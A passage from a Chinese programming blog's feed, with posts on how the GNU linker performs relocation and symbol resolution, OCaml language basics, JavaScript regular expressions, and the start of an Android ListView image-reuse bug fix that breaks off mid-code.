    <content type="html"><![CDATA[<blockquote>  <p>GCC的工作，到生成汇编代码为止。剩下的工作，交给了Binutils来完成：assembler和static linker。linker主要完成的是静态链接，目标文件合并的工作。例如，把多个.o文件合并成一个可执行文件。</p></blockquote><h1>两步链接</h1><p>两步链接指的是：</p><ol>  <li>    <p>空间与地址的分配<br> 链接器会首先扫描所有的输入文件，获得各个段的长度、属性和位置，将段合并；并将输入目标文件中的符号表合并为全局符号表。    </p>  </li>  <li>    <p>符号解析与重定位<br> 使用上一步中收集到的信息，进行符号解析和重定位，调整代码中的地址等。这一步也是链接过程的核心，特别是重定位过程。      <br> 链接器首先获取各个段的虚拟地址；在确定段的虚拟地址之后，也就能确定各个符号的虚拟地址了。    </p>  </li></ol><h1>重定位与符号解析</h1><p>在完成空间和地址的分配之后，链接器开始进行符号解析和重定位的过程。在链接之前，各个段中的符号地址，都是以0为基地址的，对于未知的地址，也通通用0进行替代。编译器在编译时，对于不知道的符号地址，全部用一个假值替代，把真正的工作留给链接器去做。</p><p>而链接器在分配了虚拟地址之后，就可以修正每一个需要重定位的入口。这个工作是借助于重定位表来实现的。重定位表包括：<strong>重定位入口</strong>（也就是需要重定位的地方），<strong>偏移</strong>表示入口在被重定位的段中的位置。</p><p>在x86_64下，重定位表的结构也很简单（定义在elf.h当中）：</p><pre><code>typedef struct{Elf64_Addr r_offset;Elf64_Xword r_info;}Elf64_Rel;typedef struct{Elf64_Addr r_offset;Elf64_Xword r_info;ELF64_Sxword r_addend;}Elf64_Rela</code></pre><p>这里，<code>r_offset</code>指定应用重定位操作的位置；<code>r_info</code>则指定必须对其进行重定位的符号表索引以及要应用的重定位类型。其低位表示重定位入口的类型；高位表示重定位入口的符号，在符号表中的下标。（不同处理器的格式不一样）</p><p>符号解析则是为符号的重定位提供帮助，根据多个目标文件中的符号表，生成全局符号表，找到相应的符号并进行重定位。对于未定义的符号，链接器都应该能在全局符号表中找到，否则就报出符号未定义的错误。<br> PS：x86_64只使用Elf64_Rela。</p><h1>指令修正</h1><p>在x86_64中，call、jmp、mov、lea等指令的寻址方式千差万别。对于重定位来说，修正指令的寻址方式定义在binutils/elfcpp/x86_64.h当中。这其中主要包括：<code>R_X86_64_64</code>和<code>R_X86_64_PC32</code>两种。这是因为X86_64上，相对寻址依然只支持32位（实际上这也很科学；因为一个可执行文件通常不会有4G那么大）。<br> 两种寻址方式的修正方法分别为：  <code>符号地址 + 保存在被修正位置的值</code>和<code>符号地址 + 保存在被修正位置的值 - 被修正的位置相对于段开始的偏移量</code></p><h1>源码分析</h1><h2 id="初始化-parsing-command-line-script-file">初始化，parsing command line &amp; script file</h2><p>linker的入口，在ldmain.c当中(通常在链接的时候，通过编译器内部直接进行调用)。首先，linker会调用bfd库，识别二进制文件的格式，生成各个段的描述符，并且转换为<code>canonical form</code>。（例如linker中的符号表识别工作，就是首先由BFD来进行分析和转化，然后linker直接在<code>canonical form</code>上进行操作，再由BFD来进行输出）因此在ldmain.c的<code>main</code>中，首先进行的也是bfd的初始化<code>bfd_init</code>。随后linker进行了一系列的设置，包括路径，回调函数、初始化，加载插件、读取命令、linker  script等。</p><h2 id="文件和符号的加载">文件和符号的加载</h2><p>随后，<code>lang_process</code>中，linker会对每个输入文件进行处理。对于每个输入文件，linker都会分配一个bfd，对输入文件进行扫描，识别出其中的符号。首先<code>open_input_bfds</code>为所有文件建立了bfd，随后载入文件中的所有符号。每个符号对应一个<code>bfd_link_hash_entry</code>，它们保存在<code>bfd_link_hash_table</code>当中。</p><p><code>bfd_link_add_symbols</code>将符号添加到hash_table当中。</p><h2 id="输入文件的分析和合并">输入文件的分析和合并</h2><p>在链接的第一部分完成后，第二部分开始前，链接器首先调用了<code>ldctor_build_sets</code>函数，它主要为C++中的constructor/dectructor提供支持。随后链接器<code>lang_do_memory_region</code>计算出内存区域（它们保存在<code>lang_memory_region_list</code>当中）。再通过<code>lang_common</code>处理全局符号，将它们添加到对应的section，移除没有被使用的sections等。随后链接器建立输入section和输出section之间的映射关系，并且将文件的section合并，以及设置段的属性等。</p><h2 id="重定位">重定位</h2><p>第四步是符号的重定位工作。这里<code>lang_size_section</code>首先获取所有section的大小，然后<code>lang_set_startof</code>会修正section的大小和位置。在确定了sections的信息之后，就可以对符号进行重定位了，这便是<code>lang_do_assignments</code>和<code>ldexp_finalize_syms</code>的工作。它们会按照前面提到的方法，对符号进行重定位。最后链接器还会检查符号和section的正确性。</p><h2 id="交给bfd-输出文件">交给bfd，输出文件</h2><p>在完成重定位之后，如果没有出现异常，linker就把工作交给bfd了。<code>ldwrite</code>负责把链接好的文件输出。完成一些清理工作后，整个链接过程就结束了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/41311c08/">http://home.meng.uno/articles/41311c08/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      GCC的工作，到生成汇编代码为止。剩下的工作，交给了Binutils来完成：assembler和static linker。linker主要完成的是静态链接，目标文件合并的工作。例如，把多个.o文件合并成一个可执行文件。

两步链接
两步链接指的是：

 1.  空间与地址的分配
    链接器会首先扫描所有的输入文件，获得各个段的长度、属性和位置，将段合并；并将输入目标文件中的符号表合并为全局符号表。 
    
    
 2.  符号解析与重定位
    使用上一步中收集到的信息，进行符号解析和重定位，调整代码中的地址等。这一步也是链接过程的核心，特别是重定位过程。 
    链接器首先
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="链接器" scheme="http://home.meng.uno/tags/%E9%93%BE%E6%8E%A5%E5%99%A8/"/>
    
      <category term="静态链接" scheme="http://home.meng.uno/tags/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/"/>
    
  </entry>
  
  <entry>
    <title>Ocaml学习</title>
    <link href="http://home.meng.uno/articles/b303bc00/"/>
    <id>http://home.meng.uno/articles/b303bc00/</id>
    <published>2017-04-10T03:25:39.000Z</published>
    <updated>2020-12-02T01:57:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>网上关于Ocaml的资料比较少，可见它是一门偏小众的语言。不过在DSL和程序分析方面，Ocaml是十分强大的。</p></blockquote><h1>函数的定义和调用</h1><p>Ocaml中，定义函数的语法很简单。这个函数是输入两个浮点数后计算它们的平均值。</p><pre><code>let average a b =(a +. b) /. 2.0;;</code></pre><p>在C当中，如果要定义一个相同的函数，其定义是这样的：</p><pre><code>double average(double a, double b){return (a + b) / 2;}</code></pre><p>可以看到，OCaml没有定义a和b的类型，而且也没有所谓的<code>return</code>，而且写的是<code>2.0</code>，没有用隐式转换。这其实是由Ocaml语言的特性决定的：</p><ul>  <li>Ocaml是强静态类型的语言</li>  <li>OCaml使用类型推倒，不需要注明类型</li>  <li>OCaml不做任何隐式转换(所以要写浮点数就必须是2.0)</li>  <li>OCaml不允许重载，<code>+.</code>表示两个浮点数相加，也就是说操作符是和类型相关的</li>  <li>OCaml的返回值是最后的表达式，不需要<code>return</code></li></ul><p>和大多数基于C的语言不同，OCaml的函数调用，是没有括号的。例如定义了一个函数<code>repeated</code>，它的参数是一个字符串<code>s</code>和一个数<code>n</code>，那么它的调用形式会是：</p><pre><code>repeated &quot;hello&quot; 3(*this is Ocaml code*)</code></pre><p>可以看到既没有括号，也没有都好。不过<code>reoeated (&quot;hello&quot;, 3)</code>也是合法的，只不过它的参数是一个含两个元素的对(pair)。</p><h1>基本类型、转换与推倒</h1><table>  <thead>    <tr>      <th>类型</th>      <th>范围</th>    </tr>  </thead>  <tbody>    <tr>      <td>int</td>      <td>32bit:31位;64bit:63位</td>    </tr>    <tr>      <td>float</td>      <td>双精度，类似于C中的double</td>    </tr>    <tr>      <td>bool</td>      <td>true/flase</td>    </tr>    <tr>      <td>char</td>      <td>8bit字符</td>    </tr>    <tr>      <td>string</td>      <td>字符串</td>    </tr>    <tr>      <td>unit</td>      <td>写作()，类似void</td>    </tr>  </tbody></table><p>这里，Ocaml内部使用了int中的一位来自动管理内存(垃圾收集)，因此会少一位。 前面也提到，OCaml是没有隐式类型转换的。因此</p><pre><code>1 + 2.5;;1 +. 2.5;;</code></pre><p>在OCaml中是会报错的。但是如果一定要让一个整数和浮点数相加，就必须显示的进行转换，比如：</p><pre><code>float_of_int i +. f;;float i +. f;;</code></pre><p>许多情况下，不需要声明函数的变量和类型，因为Ocaml自己会知道，它会一直检查所有的类型匹配。比如前面的average函数，就能够自给判断出这个函数需要两个浮点数参数和返回一个浮点数。</p><h1>函数的递归和类型</h1><p>和基于C的语言不同之处在于，OCaml中，函数一般不是递归的，除非用let rec代替let定义递归函数。这是一个递归函数的例子：</p><pre><code>let rec range a b =if a &gt; b then []else a :: range (a+1) b</code></pre><p>let和let rec的唯一区别，就是函数的定义域。举个例子，如果用<code>let</code>定义<code>range</code>，那么<code>range</code>会去找一个已经定义好的函数，而不是它自身。不过在性能上，<code>let</code>和<code>let rec</code>并没有太大的差异。所以即使全部用<code>let rec</code>来定义也可以。 而OCaml的类型推倒，也使得几乎不用显式的写出函数的类型。不过Ocaml经常以这样的实行显示参数和返回值的类型：</p><pre><code>f:arg1 -&gt; arg2 -&gt; ... -&gt; argn -&gt; rettypef: 'a-&gt;int(*单引号表示人意类型*)</code></pre><h1>表达式</h1><p>在Ocaml当中，局部变量/全局变量其实都是一个表达式。例如，局部表达式有：</p><pre><code>let average a b =let sum = a +. b insum /. 2.0;;</code></pre><p>标准短语<code>let name = expression in</code>是用来定义一个命名的局部表达式的。<code>name</code>在这个函数当中，就可以代替<code>expression</code>，直到一个<code>;;</code>结束这个代码块。这里把<code>let ... in</code>视为一个整体。和C中不一样，OCaml中<code>name</code>只是<code>expression</code>的一个别名，我们是不能给<code>name</code>赋值或者改值的。<br>  而全局表达式，也可以像定义局部变量一样定义全局名，但这些也不是真正的变量，而只是缩略名。</p><pre><code>let html =let content = read_whole_file file in  GHtml.html_from_string content  ;;let menu_bold () =  match bold_button#active with  | true -&gt; html#set_font_style ~enable:[`BOLD] ()  | false -&gt; html#set_font_style ~disable:[`BOLD] ()  ;;let main () =  (* code omitted *)  factory#add_item &quot;Cut&quot; ~key:_X ~callback: html#cut  ;;</code></pre><p>这里，<code>html</code>实际上是一个“小部件”，没有指针去保存它的地址，也不能赋值，而是在之后的两个函数中被引用。</p><h1>Let-绑定</h1><p>绑定，<code>let ...</code>，能够在OCaml中，实现真正的变量。在OCaml中，引用使用关键字<code>ref</code>来进行定义。例如，</p><pre><code>let my_ref = ref 0;;(*引用保存着一个整数0*)myref := 100(*引用被赋值为100*)</code></pre><p><code>:=</code>用来给引用赋值，而<code>！</code>用来取出引用的值。以下是一个C和OCaml的比较</p><pre><code>OCaml                   C/C++let my_ref = ref 0;;    int a = 0; int *my_ptr = &amp;a;my_ref := 100;;         *my_ptr = 100;!my_ref                 *my_ptr</code></pre><h1>嵌套函数</h1><p>与C语言不同的是，OCaml是可以使用嵌套函数的。</p><pre><code>  let read_whole_channel chan =  let buf = Buffer.create 4096 in  let rec loop () =    let newline = input_line chan in    Buffer.add_string buf newline;    Buffer.add_char buf '\n';    loop ()  in  try    loop ()  with    End_of_file -&gt; Buffer.contents buf;;</code></pre><p>这里，<code>loop</code>是只有一个嵌套函数，在<code>read_whole_channel</code>中，是可以调用<code>loop()</code>的，但它在<code>read_whole_channel</code>当中并没有定义，嵌套函数可以使用主函数当中的变量，它的格式和局部命名表达式是一致的。</p><h1>模块和OPEN</h1><p>OCaml也提供了很多模块，包括画图、数据结构、处理大数等等。这些库位于<code>usr/lib/ocaml/VERSION</code>。例如一个简单的模块<code>Graphics</code>，如果想使用其中的函数，有两种方法。第一种是在开头声明<code>open Graphics</code>，第二种是在函数调用之前加上前缀，例如<code>Graphics.open_graph</code>。<br> 如果想用  <code>Graphics</code>当中的符号，也可以通过重命名的方式，简化前缀。</p><pre><code>module Gr = Graphics;;</code></pre><p>这个技巧在模块嵌套时十分有用。</p><h1><code>;;</code>还是<code>;</code>，或者什么都不用？</h1><p>在OCaml中，有时候会使用<code>;;</code>，有时候会使用<code>;</code>，有时候却什么都不用，这就让初学者很容易迷惑。这里，OCaml实际上定义了一系列的规则。<br> #1 必须使用<code>;;</code>在代码的最顶端，来分隔不同语句(不同代码段之间的分隔)，并且<strong>不要</strong>在函数定义或其他语句中使用<br> #2 可以在某些时候省略掉<code>;;</code>，包括<code>let</code>，<code>open</code>，<code>type</code>之前，文件的最后，以及OCaml能自动判断的地方<br>  #3 <code>let ... in</code>是一条单独道语句，不能在后面加单独的<code>;</code><br> #4 所有代码块中其他语句后面，跟上一个单独的<code>;</code>，最后一个例外</p><p>看到这些规则，我依然没有完全理解这三者的用法。我想，只有实际接触过Ocaml代码，才能逐渐体会到其中的精髓吧。</p><h1>模块</h1><p>OCaml把每一段代码，都包装成一个模块。例如两个文件<code>amodule.ml</code>和<code>bmodule.ml</code>都会定义一个模块，分别为Amodule和Bmodule。 通常模块是一个个编译的，比如</p><pre><code>ocamlopt -c amodule.mlocamlopt -c bmodule.mlocamlopt -o hello amodule.cmx bmodule.cmx</code></pre><p>那么访问模块中的内容可以使用<code>open</code>，也可以使用<code>module.func</code>这样的方式。<br> 通常模块会定义为  <code>struct...end</code>的形式，这样能够形成一个有效的闭包，防止命名的重复等，它需要和一个<code>module</code>关键字绑定。比如：</p><pre><code>module PrioQueue = struct...end;;</code></pre><h1>接口、签名</h1><p>通常模块中的所有定义，都可以从外部进行访问。但实际中，模块只应该提供一系列接口，隐藏一些内容，这也是面向对象语言中所提倡的。模块是定义在<code>.ml</code>文件中的，而相应的接口，则是从<code>.mli</code>文件中得到的。它包含了一个带有类型的值的表。例如，对于一个模块来说，它的接口可以这样定义：</p><pre><code>(*模块定义*)let message = &quot;Hello&quot;let hello() = print_endline message(*接口定义*)val hello : uint -&gt; unit</code></pre><p>这样，接口的定义就隐藏了<code>message</code>。这里，<code>.mli</code>文件是在<code>.ml</code>文件之前编译的。<code>.mli</code>用<code>ocamlc</code>来编译，而<code>.ml</code>则是用<code>ocamlopt</code>来编译的。<code>.mli</code>文件就是所说的“签名”。</p><pre><code>ocamlc -c amodule.mliocamlopt -c amodule.ml</code></pre><h1>类型</h1><p>值可以通过把它们的名字和类型，放到.mli文件的方式来导出。</p><pre><code>val hello : unit -&gt; unit</code></pre><p>但模块经常定义新的类型。例如，</p><pre><code>type date = { day : int; month : int; year : int }</code></pre><p>这里其实有几种.mli文件的写法，例如，包括：</p><ul>  <li>完全忽略类型</li>  <li>把类型定义拷贝到签名</li>  <li>把类型抽象，只给出名字<code>type date</code></li>  <li>把域做成只读的:<code>type date = private{...}</code></li></ul><p>如果采用第三种方式，那么模块的用户就只能操作date对象，使用模块提供的函数去间接进行访问。</p><h1>子模块</h1><p>一个给定的模块，可以在文件中显示的定义，成为当前模块的字模块。通过约束一个给定自模块的接口，是能够达到和写一对<code>.mli/.ml</code>文件一样的效果的。例如：</p><pre><code>module type Hello_type = sigval hello : unit -&gt; unitendmodule Hello : Hello_type = struct...end</code></pre><h1>仿函数（函子）</h1><p>OCaml中的仿函数，定义与其他语言不太一样，它是用另一个模块，来参数化的模块。它允许传入一个类型作为参数，但这在OCaml中直接做是不可能的。个人理解，这里的函子和C++中的STL比较类似，它接受不同类型的输入作为初始化。事实上在OCaml中，map和set模块都是要通过函子来使用的。<br> 例如，标准库定义的  <code>Set</code>模块，就提供了一个<code>Make</code>函子。假如要使用不同类型的集合，可以这样这样利用函子：</p><pre><code># module Int_set = Set.Make (struct type t = int let compare = compare end)# module String_set = Set.Make (String);;</code></pre><p>至于函子的定义，则是这样：</p><pre><code>module F(X : X_type) = struct...end</code></pre><p><code>X</code>是作为参数被传递的模块，而<code>X_type</code>是它的签名，这种写法是强制。</p><pre><code>module F(X:X_type) : Y_type = struct...end</code></pre><p>这种写法对于返回模块的签名，也能够进行约束。函子的操作也是比较难理解的，多使用set/map，并且阅读这两个库中的源码，是能够帮助理解和记忆的。</p><h1>模式匹配</h1><p>OCaml能够把数据结构分开，并对其做模式匹配。这里举一个例子，表示一个数学表达式<code>n * (x + y)</code>，并且分解公因式为<code>n * x + n * y</code><br> 首先定义一个表达式类型：</p><pre><code># type expr =| Plus of expr * expr        (* means a + b *)| Minus of expr * expr       (* means a - b *)| Times of expr * expr       (* means a * b *)| Divide of expr * expr      (* means a / b *)| Value of string            (* &quot;x&quot;, &quot;y&quot;, &quot;n&quot;, etc. *);;</code></pre><p>那么，对于一个表达式，用模式匹配的方式，可以将其打印成对应的数学表达式：</p><pre><code># let rec to_string e =match e with| Plus (left, right) -&gt;   &quot;(&quot; ^ to_string left ^ &quot; + &quot; ^ to_string right ^ &quot;)&quot;| Minus (left, right) -&gt;   &quot;(&quot; ^ to_string left ^ &quot; - &quot; ^ to_string right ^ &quot;)&quot;| Times (left, right) -&gt;   &quot;(&quot; ^ to_string left ^ &quot; * &quot; ^ to_string right ^ &quot;)&quot;| Divide (left, right) -&gt;   &quot;(&quot; ^ to_string left ^ &quot; / &quot; ^ to_string right ^ &quot;)&quot;| Value v -&gt; v;;val to_string : expr -&gt; string = &lt;fun&gt;# let print_expr e =print_endline (to_string e);;val print_expr : expr -&gt; unit = &lt;fun&gt;</code></pre><p>这样，使用print_expr，就能够把一个表达式打印成一个数学表达式。那么，模式匹配的通用形式是：</p><pre><code>match value with| pattern    -&gt;  result| pattern    -&gt;  result  ...</code></pre><p>或者对条件进行进一步的约束</p><pre><code>match value with| pattern  [ when condition ] -&gt;  result| pattern  [ when condition ] -&gt;  result  ...</code></pre><p>注意，这里还有一种特殊的模式匹配，<code>| _</code>，它用来匹配剩下的任意情况。</p><h1>奇奇怪怪的操作符</h1><p>OCaml中，还有许多有趣的操作符和表达式。在SO上，我也看到了类似的提问：</p><pre><code>let m = PairsMap.(empty |&gt; add (0,1) &quot;hello&quot; |&gt; add (1,0) &quot;world&quot;) </code></pre><p>这里有两个问题。第一个，<code>module.(e)</code>是啥意思？它其实等价于<code>let open Module in e</code>，它相当于一种简写的形式，同样是把module引入当前模块的方式。<br> 第二个  <code>|&gt;</code>表达式是什么意思？其实它是<code>Pervasives</code>中定义的一个操作符，其定义为<code>let (|&gt;) x f = f x</code>。它被称为&quot;reverse application function&quot;（我不知道应该如何翻译），但它的作用，是把连续的调用去有效的串联起来（可以把函数放在参数之后，从而保证一个调用顺序，有一点类似管道的意思）。如果不使用<code>|&gt;</code>符号，那么就必须写成：</p><pre><code>let m = PairsMap.(add(1,0) &quot;world&quot; (add(0,1) &quot;hello&quot; empty))</code></pre><p>在Uroboros当中，还看到有一个奇怪的操作符，那便是<code>@</code>，从manual上来看，这个操作符的意思是“串联List”。有这样的例子：</p><pre><code># List.append [1;2;3] [4;5;6];;- : int list = [1; 2; 3; 4; 5; 6]# [1;2;3] @ [4;5;6];;- : int list = [1; 2; 3; 4; 5; 6]</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/b303bc00/">http://home.meng.uno/articles/b303bc00/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      网上关于Ocaml的资料比较少，可见它是一门偏小众的语言。不过在DSL和程序分析方面，Ocaml是十分强大的。

函数的定义和调用
Ocaml中，定义函数的语法很简单。这个函数是输入两个浮点数后计算它们的平均值。

let average a b =
	(a +. b) /. 2.0;;


在C当中，如果要定义一个相同的函数，其定义是这样的：

double average(double a, double b){
return (a + b) / 2;
}


可以看到，OCaml没有定义a和b的类型，而且也没有所谓的return，而且写的是2.0，没有用隐式转换。这其实是由Ocaml语言
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Ocaml" scheme="http://home.meng.uno/tags/Ocaml/"/>
    
      <category term="静态分析" scheme="http://home.meng.uno/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="http://home.meng.uno/articles/2f57a694/"/>
    <id>http://home.meng.uno/articles/2f57a694/</id>
    <published>2017-04-04T06:44:58.000Z</published>
    <updated>2020-12-02T02:03:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。搜索模式可用于文本搜索和文本替换。</em></strong></p><h1>什么是正则表达式？</h1><ul>  <li>    <p>正则表达式是由一个字符序列形成的搜索模式。</p>  </li>  <li>    <p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。</p>  </li>  <li>    <p>正则表达式可以是一个简单的字符，或一个更复杂的模式。</p>  </li>  <li>    <p>正则表达式可用于所有文本搜索和文本替换的操作。</p>  </li></ul><h1>使用字符串方法</h1><p><em>在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。</em></p><ul>  <li>    <p>search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子字符串的起始位置。</p>  </li>  <li>    <p>replace() 方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子字符串。</p>  </li></ul><h1>search() 方法使用正则表达式</h1><p><em>使用正则表达式搜索 “w3cschool” 字符串，且不区分大小写：</em></p><pre><code>varstr =&quot;Visit w3cschool&quot;;varn = str.search(/w3cschool/i);</code></pre><p><em>输出结果为：</em></p><pre><code>6</code></pre><h1>replace() 方法使用正则表达式</h1><p><em>使用正则表达式且不区分大小写将字符串中的 Microsoft 替换为 w3cschool :</em></p><pre><code>varstr =&quot;Visit Microsoft!&quot;;varres = str.replace(/microsoft/i,&quot;w3cschool&quot;);</code></pre><p><em>结果输出为:</em></p><pre><code>Visit w3cschool!</code></pre><h1>正则表达式修饰符</h1><p><em>修饰符可以在全局搜索中不区分大小写:</em></p><p><em>修饰符描述</em></p><pre><code>i       执行对大小写不敏感的匹配。g      执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。m      执行多行匹配。</code></pre><h1>正则表达式模式</h1><p><strong><em>方括号用于查找某个范围内的字符：</em></strong></p><p><em>表达式描述</em></p><pre><code>[abc]    查找方括号之间的任何字符。[0-9]    查找任何从 0 至 9 的数字。(x|y)    查找任何以 | 分隔的选项。</code></pre><h1>元字符是拥有特殊含义的字符</h1><p><strong><em>元字符描述</em></strong></p><pre><code>\s：用于匹配单个空格符，包括tab键和换行符；\S：用于匹配除单个空格符之外的所有字符；\d：用于匹配从0到9的数字；\w：用于匹配字母，数字或下划线字符；\W：用于匹配所有与\w不匹配的字符；. ：用于匹配除换行符之外的所有字符。\uxxxx    查找以十六进制数 xxxx 规定的 Unicode 字符。</code></pre><h1>量词</h1><p><strong><em>量词描述</em></strong></p><pre><code>n+    匹配任何包含至少一个n的字符串。n*    匹配任何包含零个或多个n的字符串。n?    匹配任何包含零个或一个n的字符串。</code></pre><h1>使用 RegExp 对象</h1><p><strong><em>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</em></strong></p><h1>使用 test()</h1><p><strong><em>test() 方法是一个正则表达式方法。</em></strong></p><ul>  <li>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</li></ul><p><strong>以下实例用于搜索字符串中的字符 “e”：</strong></p><p><strong><em>实例</em></strong></p><pre><code>varpatt = /e/;patt.test(&quot;The best things in life are free!&quot;);</code></pre><p><strong><em>字符串中含有 “e”，所以该实例输出为：</em></strong></p><pre><code>true</code></pre><p><strong><em>你可以不用设置正则表达式的变量，以上两行代码可以合并为一行：</em></strong></p><pre><code>/e/.test(&quot;The best things in life are free!&quot;)</code></pre><h1>使用 exec()</h1><ul>  <li>    <p>exec() 方法是一个正则表达式方法。</p>  </li>  <li>    <p>exec() 方法用于检索字符串中的正则表达式的匹配。</p>  </li></ul><p><strong>该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</strong></p><p><strong><em>以下实例用于搜索字符串中的字母 “e”:</em></strong></p><p><strong><em>Example 1</em></strong></p><pre><code>/e/.exec(&quot;The best things in life are free!&quot;);</code></pre><p><strong><em>字符串中含有 “e”，所以该实例输出为:</em></strong></p><pre><code>e</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/2f57a694/">http://home.meng.uno/articles/2f57a694/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。搜索模式可用于文本搜索和文本替换。

什么是正则表达式？
 *  正则表达式是由一个字符序列形成的搜索模式。
   
   
 *  当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。
   
   
 *  正则表达式可以是一个简单的字符，或一个更复杂的模式。
   
   
 *  正则表达式可用于所有文本搜索和文本替换的操作。
   
   

使用字符串方法
在 JavaScript 中，正则表达式通常用于
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="正则表达式" scheme="http://home.meng.uno/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>ListView嵌套GridView显示多张图片出现图片重复、错乱、闪烁等问题</title>
    <link href="http://home.meng.uno/articles/bc099606/"/>
    <id>http://home.meng.uno/articles/bc099606/</id>
    <published>2017-03-28T16:13:43.000Z</published>
    <updated>2020-12-02T01:54:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>场景</h1><p>为了实现一个订单下多个商品同时评价功能，列表分五种状态（非常满意，满意，一般，较差，不满意）展示，用一个listview，item中有一个GridView，GridView中放置最多五张图片；在listview上下滑动时会出现item中的图片重复、错乱、闪烁等问题。</p><h1>出现错误</h1><p>先讲我的错误。遇到问题后Google，参考了一些资料，都是提示要在外层listview的adapter上设置setTag(), 然后在内层GridView的adapter上整体和需要标记复用的imageView上setTag()。照此执行了，还是出错；后来在同事指点下，原来外层adapter中设置gridAdapter时只是在没有塞值时<code>gridView.setVisibility(View.GONE)</code>，忘了要在有值的时候<code>gridView.setVisibility(View.VISIBLE)</code>，  所以导致在复用的时候，没有了GridView可复用。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>      </td>      <td class="code">        <pre><span class="line">//评价照片 </span><br><span class="line">String evaluateImgs = item.getEvaluateDescriptionImgs(); </span><br><span class="line">MyGridView gridView = vh.getView(R.id.evaluate_image);</span><br><span class="line">EvaluationViewGridAdapter gridAdapter; </span><br><span class="line">if (!StringUtils.isEmpty(evaluateImgs)) &#123; </span><br><span class="line">    //这里是否不需要判断包含`,`，`split`方法是否能自动判断，需要验证</span><br><span class="line">    if (evaluateImgs.contains(&quot;,&quot;)) &#123; </span><br><span class="line">        String[] imgs = evaluateImgs.split(&quot;,&quot;);</span><br><span class="line">        gridAdapter = new EvaluationViewGridAdapter(imgs, mCallback.getContext());</span><br><span class="line">        gridView.setAdapter(gridAdapter);</span><br><span class="line">        //下面这句是我忘了加的</span><br><span class="line">        gridView.setVisibility(View.VISIBLE); </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        String[] imgs = new String[]&#123;evaluateImgs&#125;;</span><br><span class="line">        gridAdapter = new EvaluationViewGridAdapter(imgs, mCallback.getContext());</span><br><span class="line">        gridView.setAdapter(gridAdapter);</span><br><span class="line">        //下面这句是我忘了加的</span><br><span class="line">        gridView.setVisibility(View.VISIBLE); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    gridView.setAdapter(gridAdapter);</span><br><span class="line">    gridView.setVisibility(View.GONE); </span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>教训：这个问题此前已经遇到过，真是不长记性，看来遇到一些常见问题还是要记录下来啊。例如写这个博客。</p></blockquote><h1>原因总结</h1><p>为了提升listview性能，缓存复用了item(某行对应的View)，ListView通过getView()获取每行的item。</p><p>滑动过程中，a. 如果某行item已经滑出屏幕，若该item不在缓存内，则put进缓存，否则更新缓存； b. 获取滑入屏幕的行item之前会先判断缓存中是否有可用的item，如果有，做为convertView参数传递给adapter的getView。</p><ul>  <li>行item图片显示重复：指当前行item显示了之前某行item的图片。</li>  <li>行item图片显示错乱：指某行item显示了不属于该行item的图片。</li>  <li>行item图片显示闪烁：上面b的情况，加载缓慢，还没加载完又滑到下一页，下一页某个item又加载出来了，所以导致图片快速覆盖，显示闪烁效果。</li></ul><h1>解决方法</h1><h2 id="第一步：listview-adapter-getview写法">第一步：ListView Adapter getView写法</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">@Override</span><br><span class="line">public View getView(int position, View convertView, ViewGroup parent) &#123;</span><br><span class="line">ViewHolder holder;</span><br><span 